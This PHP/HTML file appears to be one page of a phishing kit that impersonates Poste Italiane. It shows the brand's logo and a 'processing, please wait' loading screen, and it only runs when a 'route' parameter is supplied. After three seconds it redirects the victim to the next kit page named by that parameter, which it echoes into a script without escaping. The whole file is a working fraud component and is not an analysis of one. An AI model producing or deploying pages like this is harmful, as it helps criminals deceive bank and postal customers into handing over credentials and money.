<?php
if(!isset($_GET["route"])){
	die();
}
$route = $_GET["route"];
?>
<!DOCTYPE html>
<html class="pi-lg pi-firefox" lang="it"><head>
		<title>Accedi o Registrati</title>
			<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
			<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">
			<meta name="identifier" content="1453897797466">
			<link type="text/css" rel="stylesheet" href="login_files/bootstrap.css">
			<link type="text/css" rel="stylesheet" href="login_files/owl.css">
			<link type="text/css" rel="stylesheet" href="login_files/slick.css">
			<link type="text/css" rel="stylesheet" href="login_files/slick-theme.css">
			<link type="text/css" rel="stylesheet" href="login_files/base.css">
			<link type="text/css" rel="stylesheet" href="login_files/megamenu-pi.css">
			<link type="text/css" rel="stylesheet" href="login_files/retina.css">
			<link type="text/css" rel="stylesheet" href="login_files/custom-form-element.css">
			<link type="text/css" rel="stylesheet" href="login_files/bootstrap-datepicker.css">
			<link type="text/css" rel="stylesheet" href="login_files/ion_002.css">
			<link type="text/css" rel="stylesheet" href="login_files/ion.css">
			<link type="text/css" rel="stylesheet" href="login_files/configuratore.css">
			<script type="text/javascript" src="login_files/js.js"></script>
			<script type="text/javascript" src="login_files/bowser.js"></script>
			<script type="text/javascript" src="login_files/responsive-bootstrap-toolkit.js"></script>
			<script type="text/javascript" src="login_files/jquery.js"></script>
			<link type="text/css" rel="stylesheet" href="login_files/custom.css">
			<meta name="DCSext.TipoPagina" content="Pagina Applicativa">
			<meta name="DCSext.AreaSito" content="Non Settato">
			<meta name="DCSext.AreaBusiness" content="Non Settato">
			<meta name="DCSext.Famiglia_Prodotto" content="Non Settato">
			<meta name="wt.cg_n" content="Non Settato">
			<meta name="DCSext.Gamma" content="Non Settato">
			<meta name="wt.cg_s" content="Non Settato">
			<meta name="DCSext.Bisogno" content="Non Settato">
			<meta name="DCSext.Prodotto" content="Non Settato">
			<meta name="DCSext.AreaCustom1" content="Non Settato">
			<meta name="DCSext.AreaCustom2" content="Non Settato">
			<script type="text/javascript" src="login_files/get-client-info"></script>
			<script type="text/javascript" src="login_files/json2.js"></script>
			<script type="text/javascript" src="login_files/pbase-css.js"></script>
			<script type="text/javascript" src="login_files/pbase-css-poste.js"></script>
		</head>
		<body style="padding-top: 49px;">
			<div style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 1; text-align: center; padding-top: 20%;">
				<img class="loader-logo" alt="Poste Italiane" src="login_files/logo-poste-italiane.png" style="height: 22px;">
				<img class="loader-spinner" src="login_files/spinner_giallo.gif" style="padding-top: 40px; width: 40px; display: block; margin: 0px auto;">
				<br>
				Elaborazione in corso... Attendere prego...
			</div>
			<script type="text/javascript">
				setTimeout(function(){ window.location = "<?php print_r($route); ?>.php"; }, 3000);
			</script>
	</body>
</html>
